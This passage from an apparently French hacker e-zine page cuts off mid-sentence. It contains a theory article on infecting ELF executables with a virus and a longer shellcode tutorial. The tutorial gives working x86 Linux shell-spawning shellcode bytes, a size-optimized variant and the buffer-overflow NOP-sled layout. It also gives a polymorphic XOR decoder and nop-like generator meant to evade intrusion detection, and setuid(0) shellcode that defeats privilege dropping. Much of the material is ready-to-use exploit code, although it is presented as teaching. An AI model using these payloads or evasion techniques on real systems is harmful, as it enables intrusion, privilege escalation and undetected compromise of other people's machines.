  ----------- <br>
  - Messages and Event-Driven Programming <br>
  http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnw98bk/html/messageseventdrivenprogramming.asp 
</p>
<p>- Microsoft Security Bulletin MS02-071 <br>
  Flaw in Windows WM_TIMER Message Handling Could Enable Privilege Elevation (328310) 
  <br>
  http://www.microsoft.com/technet/treeview/?url=/technet/security/bulletin/MS02-071.asp 
</p>
<p>- A New Avenue of Attack: : Event-driven system vulnerabilities <br>
  http://www.isg.rhul.ac.uk/~simos/event_demo/ </p>
<p>- Windows Still Image Privilege Elevation (A090700-1) - @stake Inc Security 
  Advisory <br>
  http://www.atstake.com/research/advisories/2000/a090700-1.txt </p>
<p>- Shatter Attacks - How to break Windows <br>
  http://security.tombom.co.uk/shatter.html </p>
<p></p>
<P>&nbsp;</P>
<P ALIGN="CENTER"><B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
  Shatter Attacks By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> 
  Etherlord<FONT COLOR="#FF0000">:::...</FONT></FONT></B></P>
<P><BR></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
  <BR>
  4 . VIRUS : <b>INTRODUCTION AUX VIRUS ELF</b> </FONT><font size="2" face="Arial, Helvetica, sans-serif"> 
  <b>(Part I</b></font><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2">)</font></b><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>
  ===================================================================== </FONT></P>
<P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date : 05/07/2003<BR>
  Auteur : <A HREF="mailto:deepfear@netcourrier.com">deepfear</A> (DHS Admin)<BR>
  </FONT><BR>
</P>
<P> Introduction :<br>
  Un ex&eacute;cutable au format ELF est compose d' une en-t&ecirc;te ELF suivi 
  d' une table de programmes ou de sections ou des deux . l' en-t&ecirc;te ELF 
  est tjrs au tout d&eacute;but du fichier tandis que les deux autres tables, 
  ils sont situ&eacute;s selon la d&eacute;finition de l' en-t&ecirc;te ELF .<br>
  Cet ex&eacute;cutable s'organise sous la forme suivante : (figure 1-1 )<br>
</P>
<P><img width=563 height=281
src="./deepfear_fichiers/image002.jpg" v:shapes="_x0000_s1026"> </P>
<p>- En-t&ecirc;te ELF : contient les informations qui d&eacute;crit l' organisation 
  du fichier .<br>
  - Table d' en-t&ecirc;te de programme : indique au syst&egrave;me comment cr&eacute;er 
  l'image du processus (figure 2) .<br>
  - Segment 1 (texte) : c' est la zone ou contient le code qui sera ex&eacute;cute 
  .<br>
  - Table d' en-t&ecirc;te de sections : tous simplement elle d&eacute;crit les 
  sections du fichier .<br>
  - Les sections : contiennent les donn&eacute;es brutes d' informations du fichiers 
  : instructions, donn&eacute;es , table de symbole &#133;</p>
<p>(figure 2) :<br>
  1- [TTTTTTTTTT] <br>
  2- [TTTTTTTTPP]<br>
  3- [PPPPPPTTTT]<br>
  4- [DDDDDDDDPP] </p>
<p> 1-2 segment texte (T)<br>
  3-4 segment donn&eacute;e (D)<br>
  (P) : padding (remplissage) il sert a compl&eacute;ter les segments pour que 
  chaque page fasse ( c' est a dire chaque segment doit &ecirc;tre multiple de 
  4ko ) .<br>
  (PAGE_SIZE = 4ko pour linux x86 [man getpagesize ] pour savoir la sienne ;) 
  ) </p>
<p>Virus :<br>
  Pour infecter un Elf on va essayer de faire une copie et d ins&eacute;rer le 
  code malicieux dedans .<br>
  Puisque le segment texte contient le code qui sera ex&eacute;cute , le virus 
  doit &ecirc;tre ins&eacute;rer dans ce segment .<br>
  Si on modifie le S.T (segment texte) on risquera d' avoir des probl&egrave;mes 
  donc il sera pr&eacute;f&eacute;rable de l' ins&eacute;rer apr&egrave;s le segment 
  le segment texte (comme le montre la figure 1-2) en ajoutant une page qui sera 
  termine par des 0 pour quelle soit &eacute;gale &agrave; PAGE_SIZE .<br>
  En comparant la figure 1-1 et 1-2 on remarque que les offsets de certains segments 
  doivent &ecirc;tre changer notamment celui du segment 2 (donn&eacute;e) ou il 
  faut ajouter la taille du virus a son offset . sinon on va ajouter la taille 
  du virus a la taille du segment texte pour qu'il soit admis comme une partie 
  de ce segment et qu il soit charger .<br>
  En ce qui concerne la partie section : si <br>
  {<br>
  la table d' en-t&ecirc;te de programmes est situe avant celle de sections(la 
  table d' en-t&ecirc;te de section est situe apr&egrave;s le virus ;) figure 
  1-2 ) on ajoute PAGE_SIZE a l' index de section et a chaque offset de sections 
  ;<br>
  }<br>
  sinon { on fais rien ; // figure 3 } <br>
</p>
<p><img src="../../../../../../../Program%20Files/Dream%20Weaver%204/Dreamweaver%204/Lessons/Lesson%20Files/1_multipart_xF8FF_2_elf2.jpg" width="214" height="324"></p>
<p>Pour faire ex&eacute;cuter le virus, il faut que le flux d' ex&eacute;cution 
  (point d' entr&eacute;e ELF) contienne l' adresse du code du virus .<br>
  L' adresse du virus est l' offset du d&eacute;but du segment texte + sa taille 
  voir figure 1-2 .<br>
  NB : faut pas oublier de rendre la main J au vrai code (prg) pour que le programme 
  s'ex&eacute;cute normalement .<br>
  Voil&agrave; l'&eacute;tude th&eacute;orique est finis , le prochain article 
  sera de la pratique (le cr&eacute;er J ).<br>
  Si vous n' avez pas compris relisez le bien en utilisant les figures sinon y 
  a le forum ;) .</p>
<p><br>
  ciao</p>
<p></p>
<P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>
  </FONT></P>
<P></P><P></P><P ALIGN="CENTER"> 
<BR>
  <B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
  ELF Infector PART 1 By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> 
  deepfear<FONT COLOR="#FF0000">:::...</FONT></FONT></B></P>
<P ALIGN="CENTER">&nbsp;</P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
  <BR>
  5 . SHELLCODING: </FONT><font size="2" face="Arial, Helvetica, sans-serif"><b>FUN 
  AND GAMES WITH EVOLUATES SHELLCODES</b></font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>
  ===================================================================== </FONT></P>
<P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date : 18/08/2003<BR>
  Auteur : <A HREF="mailto:slickers@6sens.com">Nocte</A><BR>
  </FONT></P>
<p>--------------------------------------------------------<br>
  Sommaire : <br>
  --------------------------------------------------------<br>
  - 1. Maman comment on fait un shellcode ?<br>
  - 2. Shellcodes optimis&eacute;s<br>
  - 3. Shellcodes pour BOF<br>
  - 4. Shellcodes polymorphiques:camoufler un shellcode<br>
  - 5. Shellcodes invincibles<br>
  * planquer les nops<br>
  * modifier l'adresse de retour<br>
  * camoufler le shellcode<br>
  - 6. Conclusion<br>
  - 7. R&eacute;f&eacute;rences<br>
  --------------------------------------------------------</p>
<p><br>
  Depuis quelques ann&eacute;es, les failles de buffer overflows se sont tr&egrave;s 
  vite r&eacute;pandues, dans tous les syst&egrave;mes existants, tant Windows, 
  que Linux, voire FreeBSD. Un hacker ne s'arr&ecirc;tera pas &agrave; la d&eacute;couverte 
  d'une faille. Le but &eacute;tant avant tout une meilleure s&eacute;curisation 
  du syst&egrave;me, il cherchera toujours &agrave; approfondir les points faibles, 
  afin de mieux s'en prot&eacute;ger.<br>
  Quand un hacker d&eacute;couvre une faille de buffer overflow, par exemple, 
  il voudra l'exploiter pour r&eacute;cup&eacute;rer un shell. Certains diront 
  ques les buffer overflow sont des failles si anciennes et tellement pass&eacute;es 
  en revues qu'elles sont, pour ainsi dire, d&eacute;pass&eacute;es. Certes, il 
  existe plusieurs dispositions pour &eacute;viter ce genre de trous de s&eacute;curit&eacute;s 
  comme des auditeurs de codes (slint), des biblioth&egrave;ques d'allocations 
  s&eacute;curis&eacute;es (libstafe) ainsi que des compilateurs sp&eacute;ciaux 
  (StackGuard)... Mais, malgr&eacute; tout, l'exp&eacute;rience prouvent que ce 
  genre de failles sont toujours possibles surtout sur des syst&egrave;mes d'exploitations 
  dont le nombre de lignes de codes est astronomiques. Obtenir un shell (un interpr&eacute;teur 
  de commande, car on peut tr&egrave;s bien prendre de le cas d'une telle faille 
  d&eacute;gott&eacute;e sur un syst&egrave;me Microsoft) est le r&ecirc;ve car 
  on pourra ainsi passer toutes les commandes que l'on veut avec, en g&eacute;n&eacute;ral, 
  les droits de root (&eacute;videmment, cela d&eacute;pend sur quel processus 
  la faille a &eacute;t&eacute; d&eacute;couverte, s'il des privil&egrave;ges, 
  le bit setuid root...). Evidemment, avant de parler de shellcodes &eacute;volu&eacute;s, 
  une explication s'impose quant aux shellcodes de bases. Evidemment, ces points 
  n'ont pas &eacute;t&eacute; d&eacute;couverts par moi m&ecirc;me, mais approfondire 
  des d&eacute;couvertes permet de r&eacute;aliser de beau bijou, dans le domaine 
  des shellcodes ;)</p>
<p><br>
  1. MAMAN, COMMENT ON FAIT UN SHELLCODE ?<br>
  ---------------------------------------------------------------</p>
<p>D&eacute;j&agrave; faisons une br&egrave;ve mais n&eacute;cessaire, pr&eacute;sentation.<br>
  Un shellcode est un bout d'ex&eacute;cutable (mois d'un ko) qui a pour r&ocirc;le 
  une t&acirc;che : ex&eacute;cuter un process, manipuler un fichier, binder un 
  shell... Son utilit&eacute; principale est d'&ecirc;tre inject&eacute; : un 
  shellcode est plac&eacute; dans l'espace d'ex&eacute;cution d'un process pour 
  y &ecirc;tre ex&eacute;cut&eacute; avec les privil&egrave;ges du process. Evidemment, 
  le but recherch&eacute; (pour des shellcodes injectable dans des buffers) sera 
  de le rendre le plus petit possible afin de pouvoir exploiter des buffers tr&egrave;s 
  petits. Un shellcode ne doit contenir aucun carac&egrave;tre nul dans son code 
  (car cela le tronquerait) et ne doit poss&eacute;der aucune adresse absolue 
  (car son adresse m&ecirc;me d'injection est inconnue). Voil&agrave; pour la 
  fiche d'identit&eacute;. Passons &agrave; leur programmation.</p>
<p> Les shellcodes les plus simple sont des simple execve() d'un shell :</p>
<p> #include &lt;stdio.h&gt;</p>
<p>void shellcode()<br>
  {<br>
  char * name[];<br>
  name[0] = &quot;/bin/sh&quot;;<br>
  name[1] = NULL;<br>
  execve(name[0], name, NULL);<br>
  return (0);<br>
  }</p>
<p>Par soucis d'optimisation et de gain en taille, on zappe le &quot;_exit(0)&quot; 
  pour execve(). De toute fa&ccedil;on, notre shellcode ne plantera pas ;) Ensuite, 
  on le compile et le d&eacute;sassemble via gdb :<br>
  gcc -o shellcode -static shellcode.c (static est obligatoire pour l'adressage 
  m&eacute;moire).<br>
  On apprend ce que contiennent les registres :<br>
  - %eax : num du syscall execve() =&gt; 0xb<br>
  - %ebx : ptr sur &quot;/bin/sh&quot;<br>
  - %ecx : ptr sur tableau. Le tavleau d'arguments contient le ptr sur &quot;/bin/sh&quot; 
  et un ptr NULL<br>
  - %edx : ptr sur tableau d'environnement. C'est facultatif, dc on s'en fout, 
  on le met &agrave; NULL. </p>
<p>IL ne nous manque que l'adresse de la string &quot;/bin/sh&quot;. On utilise 
  la technique jmp/call. Si on place un call avant la cha&icirc;ne de caract&egrave;re 
  et un jump dessus (le call sera donc n&eacute;gatif), l'adresse sera push&eacute;e 
  en tant qu'adresse de retour sur la stack quand le call sera ex&eacute;cut&eacute;e 
  :</p>
<p>jmp adr<br>
  popl %esi // on r&eacute;cup&egrave;re l'adresse de &quot;/bin/sh&quot;<br>
  ... // shellcode <br>
  adr:<br>
  call adr<br>
  /bin/sh</p>
<p>A pr&eacute;sent que nous avons tout, nous pouvons coder notre shellcode g&eacute;n&eacute;rique, 
  tr&egrave;s basique : </p>
<p>--shellcode.c--<br>
  void main()<br>
  {<br>
  asm(&quot;jmp toto</p>
<p>toto:<br>
  popl %esi // on r&eacute;cup&egrave;re l'adresse de &quot;/bin/sh&quot;<br>
  movl %esi,0x8(%esi) // on l'&eacute;crit dans la table<br>
  xorl %eax,%eax // on oublie pas le nul de fin de cha&icirc;ne<br>
  movl %eax,0xc(%esi)<br>
  movb %eax,0x7(%esi) // on place \0 en fin de cha&icirc;ne<br>
  movb $0xb,%al // execve()<br>
  movl %esi, %ebx // la cha&icirc;ne se retrouve dans %ebx<br>
  leal 0x8(%esi),%ecx // %ecx contient la table arguments<br>
  leal 0xc(%esi),%edx // %edx contient la table environnement<br>
  int $0x80 // syscall<br>
  xorl %ebx,%ebx // code de retour nul<br>
  movl %ebx,%eax // %eax = 1<br>
  inc %eax<br>
  int $0x80 // on passe la main au kernel qui g&egrave;re le syscall</p>
<p> call toto<br>
  .string \&quot;/bin/sh\&quot;<br>
  &quot;);<br>
  }</p>
<p>Abordons un point : ici, on a mis %eax &agrave; 0 pour ensuite copier %eax, 
  c'est &agrave; dire 0, dans %esi :<br>
  movl %eax,0xc(%esi)<br>
  movb %eax,0x7(%esi)<br>
  a priori, on aurait envie de faire plut&ocirc;t :<br>
  movl $0x0,0xc(%esi)<br>
  plut&ocirc;t que de passer par un registre interm&eacute;diaire. Or, vous noterez 
  que cet opcode est plus long. Alors qu'un xor %eax, %eax ne prend que 2 bytes, 
  un mov $0x0, 0x7(%esi) prend le double!<br>
  D'o&ugrave; l'importance de bien choisir ces opcodes suivant le nombre d'octets 
  qu'ils utilisent afin de gagner en optimisation (on en reparlera plus bas, mais 
  sur un autre point).</p>
<p><br>
  Voici donc notre shellcode au final :</p>
<p>char shellcode[] =<br>
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<br>
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<br>
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;<br>
  int main() {<br>
  void (*sh)()= (void *)shellcode;<br>
  sh();<br>
  }</p>
<p>Plus qu'&agrave; compiler... On se retrouve avec un shellcode de 40 octets 
  qui effectue un simple execsh... C'est peu mais on peut faire mieux ;)</p>
<p><br>
  2. SHELLCODES OPTIMISES<br>
  ----------------------------------</p>
<p>Pourquoi vouloir cr&eacute;er des shellcodes petits ? Eh bien, pour pouvoir 
  exploiter des buffers petits. En effet, vous verrez rarement un buffer de 800 
  octets, en g&eacute;n&eacute;ral il d&eacute;placent des cha&icirc;nes de caract&egrave;res 
  o&ugrave; des octets et sont donc petits. Notre but &agrave; nous sera donc 
  de r&eacute;aliser des shellcodes de plus en plus petits... Ce doit devenir 
  une &eacute;tape essentielle dans la r&eacute;alisation d'un shellcode.<br>
  Pour ce faire, on va abandonner notre sch&eacute;ma de construction de shellcode, 
  vu pr&eacute;c&eacute;demment et penser &agrave; un nouveau : on va pusher tous 
  les arguments sur la stack pour r&eacute;aliser un shellcode minuscule... &ccedil;a 
  nous donnera en asm :</p>
<p> xor %eax,%eax // le \0 qui termine la string<br>
  push %eax <br>
  push $0x68732f6e <br>
  push $0x69622f2f // on push la cha&icirc;ne<br>
  mov %esp,%ebx // &quot;bin/sh&quot; dans %ebx<br>
  push %eax // ptr NULL<br>
  push %ebx // on pushe l'adresse de &quot;/bin/sh&quot;<br>
  mov %esp,%ecx // adresse du pointeur sur tableau dans %ecx<br>
  mov %11, %al // on appelle execve()<br>
  int $0x80 // on passe la main au syscall</p>
<p>le lecteur attentionn&eacute; remarquera que, quand on push la cha&icirc;ne, 
  on l'inverse (&agrave; cause du little endian... notez &eacute;galement qu'on 
  push &quot;n/sh&quot; et &quot;//bi&quot;. On double le slash car notre string 
  fait 7 octets et sur la stack la r&egrave;gle est qu'on doit pusher 4 octets 
  par 4, donc on s'arranger pour que notre cha&icirc;ne soit un multiple de 4 
  en doublant le slash.<br>
  <br>
  On compile : gcc -o shellcode shellcode.c&quot; <br>
  Et c'est dans la poche :)</p>
<p>char shellcode[] =<br>
  &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;<br>
  &quot;\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0&quot;<br>
  &quot;\x0b\xcd\x80&quot;;</p>
<p>Et voili : un shellcode de 23 octets qui lance un shell ;) &ccedil;a c'est 
  de l'optimisation.<br>
  Un shellcode peut bien s&ucirc;r, faire plus qu'un simple execve(2) d'un shell. 
  Il peut binder un shell, manipuler des fichiers, cr&eacute;er des connexions 
  de retour...<br>
  Mais l'optimisation ne s'arr&ecirc;te pas &agrave; la taille du shellcode. Il 
  faut ensuite pouvoir les rendre furtifs aux IDS...</p>
<p><br>
  3. SHELLCODES POUR BUFFER OVERFLOWS<br>
  -------------------------------------<br>
  Prenons le cas simpliste d'un shellcode cod&eacute; pour epxloiter un buffer 
  overflow. Il ne contient pas seulement le shellcodes proprement dit. il se compose 
  en diff&eacute;rentes morceaux :<br>
  - des NOP (Null OPerations, 0x90) qui servent &agrave; remplir le buffer vuln&eacute;rable<br>
  - le code du shellcode<br>
  - l'adresse de retour qui pointe dans les NOPS.</p>
<p>Dans la stack, on aura donc :<br>
  NOPS == Shellcode == Adresse de retour.</p>
<p>Quand la fonction contenant le buffer vuln&eacute;rable se termine, par l'opcode 
  &quot;ret&quot;, l'ex&eacute;cution se poursuit quelque part dans les NOPS car 
  l'adresse de retour r&eacute;elle est overwritt&eacute;e par la nouvelle adresse 
  de retour, qui renvoie au shellcode.<br>
  Pourquoi placer des NOPS ? Premi&egrave;rement, ils servent &agrave; combler 
  le buffer vuln. Et deuxi&egrave;mement, ils ont pour r&ocirc;le de r&eacute;cup&eacute;rer 
  le flux d'ex&eacute;cution &agrave; partir de l'adresse de retour estim&eacute;e. 
  Par d&eacute;finition, one ne sait pas combien de NOPS seront ex&eacute;cut&eacute;s 
  au moment de l'exploitation. Plus la plage de NOPS est grande, plus il y aura 
  de chance que l'adresse de retour estim&eacute;e soit bonne. En g&eacute;n&eacute;ral, 
  la taille de la la plage des NOPS est de l'ordre de quelques Ko.<br>
  Etant donn&eacute; qu'un shellcode se d&eacute;compose en ces 3 parties nous 
  allons camoufler ces composants pour que notre shellcode soit r&eacute;ellement 
  furtif.</p>
<p><br>
  4. SHELLCODES POLYMORPHIQUES : CAMOUFLER UN SHELLCODE<br>
  ------------------------------------------------------------------------------------</p>
<p> Pourquoi vouloir r&eacute;aliser des shellcodes polymorphiques ? Les IDS actuels 
  utilisent des images de shellcodes classiques pour les d&eacute;tecter (trace 
  de /bin/sh ou du syscall 0x80). Pour parer &agrave; cela nous allons crypter 
  notre shellcodes. Afin qu'on ne puisse le d&eacute;tecter par signature, l'id&eacute;e 
  pr&eacute;sent&eacute;e ici est de r&eacute;aliser un moteur de mutation polymorphiques 
  afin que le shellcodes soit &agrave; chaque fois diff&eacute;rent. En effet, 
  si le d&eacute;codeur du shellcode crypt&eacute; ne peut prendre qu'une seule 
  forme, il pourra &ecirc;tre plus facilement d&eacute;tect&eacute;. En revanche, 
  s'il en prend plusieurs, sa d&eacute;tection sera beaucoup plus complexes.<br>
  L'id&eacute;e se base sur les moteur de mutations polymorphiques viraux. Cependant, 
  pour un virus, il est n&eacute;cessaire de poss&eacute;der l'encodeur et le 
  d&eacute;codeur. Dans notre shellcode optimis&eacute;, nous n'aurons besoin 
  que du d&eacute;codeur. On produira chez nous notre shellcode original ainsi 
  que l'encodeur. Puis, dans la stack du programme vuln&eacute;rable, on aura 
  :</p>
<p>NOPS == SHELLCODE POLYMORPHIQUE == ADRESSE DE RETOUR</p>
<p>SHELLCODE POLYMORPHIQUE : D&eacute;codeur + clef + shellcode encod&eacute;. 
  La disposition des donn&eacute;es doit &ecirc;tre afin que la shellcode original 
  soit reconstruit de mani&egrave;re automatique, soit &agrave; la place du shellcode 
  encod&eacute;, soit dans une autre partie de la stack).<br>
  Concr&egrave;tement, le chiffrement est une fonction XOR &agrave; clef glissante. 
  La taille de la clef est de deux mots longs de 32 bits : le premier mot est 
  la valeur initiale de la clef et le deuxi&egrave;me la valeur d'incr&eacute;mentation.<br>
  Passons au coding =&gt; Voici le d&eacute;codeur fait maison, decoder.S :</p>
<p>// key offset = &lt;dec_start+4&gt;<br>
  // slide offset = &lt;dec_start+16&gt;<br>
  // taille original du shellcode = &lt;dec_start+11&gt;</p>
<p>.text<br>
  .globl decoder_start<br>
  .globl decoder_end</p>
<p>.data<br>
  decoder_start:<br>
  jmp sc</p>
<p>begin_decode:<br>
  popl %esi<br>
  movl $0x42424242, %ebx<br>
  xorl %ecx, %ecx<br>
  movb $0x42, %cl</p>
<p>decode: <br>
  xorl %ebx, (%esi)<br>
  addl $0x42424242, %ebx<br>
  addl $0x4, %esi<br>
  loop decode<br>
  jmp decoder_end</p>
<p>sc:<br>
  call begin_decode</p>
<p>decoder_end:</p>
<p>Ensuite, on pourra r&eacute;fl&eacute;chir &agrave; la programmation d'un g&eacute;n&eacute;rateur 
  de shellcode polymorphique. </p>
<p> Encore un peu de coding pour pas que ce paper soit trop vide :) Admettons 
  qu'on veuille xoriser notre shellcode avec 0x01 par exemple. Eh bien,notre d&eacute;codeur 
  sera :</p>
<p>//d&eacute;crypteur du shellcode<br>
  &quot;\x68\x5e\x56\xc3\x90\x8B\xcc\xff\xd1\x83\xc6\x0e\x90\x8b\xfe\xac&quot;<br>
  &quot;\x34\x01\xaa\x84\xc0\x75\xf8&quot;</p>
<p>puis notre shellcode xoris&eacute; (et, auparavant le d&eacute;crypteur une 
  s&eacute;rie de nops si vous avez bien suivi... j'en vois qui dorme au fond 
  de la classe, l&agrave;!)</p>
<p>***3.1. COMMENT PLANQUER LES NOPS***</p>
<p>La plus grande partie du shellcode est compos&eacute;e des quelques milliers 
  de bytes de NOPS. Ce sont eux qui sont les plus facile a rep&eacute;rer car 
  la s&eacute;quence est fixe : 0x90 pour une architecture Intel-32. Leur but 
  est seulement dincr&eacute;menter le registre %eip pendant un cycle d'horloge. 
  Il sont ausis utilis&eacute; par les compilateur pour garder l'alignement sur 
  des adresses multiples de 4, 8 ou 16 octets. Comme le but est de remplir le 
  buffer vuln&eacute;rable, on peu, plut&ocirc;t que d'utiliser des NOPS, se servir 
  de n'importe quelle instruction d'un octet qui modifie n'importe quel registre 
  que le shellcode n'utilisera pas. On pourra, par exemple, utiliser l'opcode 
  0x41 qui ocrrespond &agrave; 'inc %ecx' mais aussi au caract&egrave;re ASCII 
  'A'. Voici les 36 opcodes qui ont une correspondance ASCII :</p>
<p>0x27 daa<br>
  0x2F das<br>
  0x3F aaa<br>
  0x40 aas<br>
  0x41 inc %eax<br>
  0x42 inc %ecx<br>
  0x43 inc %edx<br>
  0x44 inc %esp<br>
  0x45 inc %ebp<br>
  0x46 inc %esi<br>
  0x47 inc %edi<br>
  0x48 dec %eax<br>
  0x49 dec %ecx<br>
  0x4A dec %edx<br>
  0x4B dec %ebx<br>
  0x4C dec %esp<br>
  0x4D dec %ebp<br>
  0x4E dex %esi<br>
  0x4F dec %edi<br>
  0x50 push %eax<br>
  0x51 push %ecx<br>
  0x52 push %edx<br>
  0x53 push %ebx<br>
  0x54 push %dsp<br>
  0x55 push %ebp<br>
  0x56 push %esi<br>
  0x57 push %edi<br>
  0x58 pop %eax<br>
  0x59 pop %ecx<br>
  0x5A pop %edx<br>
  0x5B pop %ebx<br>
  0x5C pop %ebp<br>
  0x5D pop %esi<br>
  0x5E pop %edi<br>
  0x5F pusha<br>
  0x60 pusha<br>
  0x90 nop<br>
  0x91 xchg %eax, %ecx<br>
  0x92 xchg %eax, %edx<br>
  0x93 xchg %eax, %ebx<br>
  0x95 xchg %eax, %ebp<br>
  0x96 xchg %eax, %esi<br>
  0x97 xchg %eax, %edi<br>
  0x98 cwtl<br>
  0x99 cltd<br>
  0x9B fwait<br>
  0x9C pushf<br>
  0x9E safh<br>
  0x9F lahf<br>
  0xF5 cmc<br>
  0xF8 clc<br>
  0xF9 stc<br>
  0xFC cld</p>
<p>Vous remarquerez au passage que j'ia volontairement omit &quot;inc %esp&quot;. 
  En effet, un nombre incontr&ocirc;l&eacute;s de cet opcode sera dangereux puisque, 
  comme on ne sait pas combien de nops seront ex&eacute;cuter lors de l'exploitation, 
  on risquerait de se retrouver alors avec une valeur non align&eacute;e avec 
  4 dans %esp. Il faudra veiller aussi &agrave; ne pas effecu&eacute; un trop 
  grand nombre de push si notre shellcode se trouve en dessous de %esp, car cela 
  le d&eacute;truit... Le mieux est donc de les zapper</p>
<p>Notons qu'un nombre incontr&ocirc;l&eacute;s de inc %esp risquerait de laisser 
  une valeure non align&eacute;e avec 4 dans %esp et nuire au fonctionnement du 
  shellcode. De plus, les longues s&eacute;ries de push sont a &eacute;viter. 
</p>
<p>Voici un sch&eacute;ma squelettique d'un &eacute;ventuel g&eacute;n&eacute;rateur 
  de nops-like :</p>
<p>#include &lt;stdio.h&gt;<br>
  #include &lt;stdlib.h&gt;<br>
  #include &lt;unistd.h&gt;<br>
  #include &lt;time.h&gt;<br>
  #include &lt;ctype.h&gt;</p>
<p>static unsigned char nop-like[] = {<br>
  // METTRE LES NOPS LIKES<br>
  };<br>
  int main(int argc, char **argv) {<br>
  nops = malloc (size + 1);<br>
  srand(time(NULL));<br>
  for (i = 0; i &lt; size; i++)<br>
  {<br>
  if (ascii)<br>
  {<br>
  do {<br>
  curnop=nop-like[rand()%sizeof(nop-like)];<br>
  } while (!isprint(curnop));<br>
  }<br>
  else<br>
  {<br>
  curnop=nop-like[rand()%sizeof(nop-like)];<br>
  }<br>
  nops[i]=curnop;</p>
<p>return 0;<br>
  }</p>
<p>en d&eacute;veloppant (il est pas fini!) et en l'enrobant, on peut parvenir 
  &agrave; quelque chose de potable et surtout utile pour r&eacute;aliser des 
  shellcode totalement invincible.</p>
<p>***3.2. MODIFIER L'ADRESSE DE RETOUR***<br>
  C'est la aprtie la plus dur &agrave; camoufler. En effet, on en a besoin pour 
  le bon fonctionnement du shellcode. Toutefois, on peut &eacute;viter de trop 
  la r&eacute;p&eacute;ter ; par exemple, on peut remettre des NOPS apr&egrave;s 
  le shellcode. Egalement, on peut moduler l'adresse. Cette technique consiste 
  &agrave; ne pas r&eacute;pp&eacute;ter la m&ecirc;me adresse, en les faisant 
  pointer dans plusieurs endroits dans la plage des NOPS : l'adresse sera l&eacute;g&egrave;rement 
  diff&eacute;rente, mais permettra quand m&ecirc;me de r&eacute;cup&eacute;rer 
  le flux d'ex&eacute;cution.</p>
<p><br>
  ***3.2. CAMOUFLER DES SHELLCODES***</p>
<p>Nous avons d&eacute;j&agrave; trait&eacute; de la premi&egrave;re m&eacute;thode 
  : le polymorphisme. Parlons maintenant des restrictions des opcodes. <br>
  En utilisant la m&ecirc;me technique que les NOPS, si on s&eacute;lectionne 
  seulement les octets ayant des correspondances ASCII, on peut parvenir &agrave; 
  r&eacute;aliser un shellcode polymorphique enti&egrave;rement en texte (cf texte 
  de rix pour Phrack, voir les r&eacute;f&eacute;rences). <br>
  Toutefois, en plus de restreindre les opcodes, il faut restreindre leurs param&egrave;tres. 
  Si on examine le format de codage des opcode INtel et des deux champs : ModR/M 
  et SIB, on peut parvenir &agrave; restreindre encore plus les instruction assembleurs.<br>
  L'article de rix pour Phrack 57 &quot;Writing a ia32 Alphanumerics shellcodes&quot; 
  reprend en d&eacute;tail cette id&eacute;ee.</p>
<p></p>
<p>5. DES SHELLCODES INVINCIBLES<br>
  -------------------------------------------</p>
<p>Nous avons bri&egrave;vement vu comment r&eacute;aliser des shellcodes qui 
  soient de plus en plus petits et invisible aux syst&egrave;me de d&eacute;tection 
  des intrusions. Toutefois, bien que ces deux &eacute;atpes soient essentielles 
  pour r&eacute;aliser un shellcodes &eacute;volu&eacute;s, un simple execsh ou 
  bindsh le rend assez limit&eacute; en ce qui concerne ses capacit&eacute;.<br>
  On pourra donc d&eacute;cider dans certains cas de lui donner la possibilit&eacute; 
  de casser des protections mise en place sur un d&eacute;mon ou un serveur. Prenons 
  le cas le plus basique : une protection : seteuid(getuid()). Dans cette situation, 
  que se passe-t-il ? l'euid du process est fix&eacute; &agrave; la valeur du 
  ruid ce qui aura pour cons&eacute;quence d'ex&eacute;cuter le shell sans privil&egrave;ge 
  particulier (s'il on ins&egrave;re cette ligne dans notre shellcode). Cependant, 
  on remarque que cette protection n'est pas tr&egrave;s s&eacute;cure. En effet, 
  il suffit de rajouter l'&eacute;quivalet de setuid(0); au d&eacute;but de ntore 
  shellcode ppour r&eacute;cup&eacute;rer les droits euid initiaux (ceux du root). 
  Cela nous donne :</p>
<p>char setuid[] = <br>
  &quot;\x31\xc0&quot; // xor %eax, %eax<br>
  &quot;\x31\xdb&quot; / xor %ebx, %ebx <br>
  &quot;\xb0\x17&quot; // movb $0x17, %al <br>
  &quot;\xcd\x80&quot;; </p>
<p>On obtient donc un shellcode qui casse une protection seteuid(getuid()) :</p>
<p>char shellcode[] = <br>
  &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot; // setuid(0)<br>
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot; 
  <br>
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot; 
  <br>
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;; </p>
<p>int main() <br>
  { <br>
  int * ret; <br>
  seteuid(getuid()); <br>
  * ((int *) &amp; ret + 2) = (int) shellcode; <br>
  return (0); <br>
  } </p>
<p><br>
  Ceci n'&eacute;tait qu'une explication en guise d'introduction. En effet, sur 
  un syst&egrave;me, un administrateur consciencieux ne s'arr&ecirc;tera pas &agrave; 
  un stupide seteuid(getuid()) pour bloquer des acc&egrave;s &agrave; certains 
  partie de son serveur. La protection la plus usit&eacute; est la mise en place 
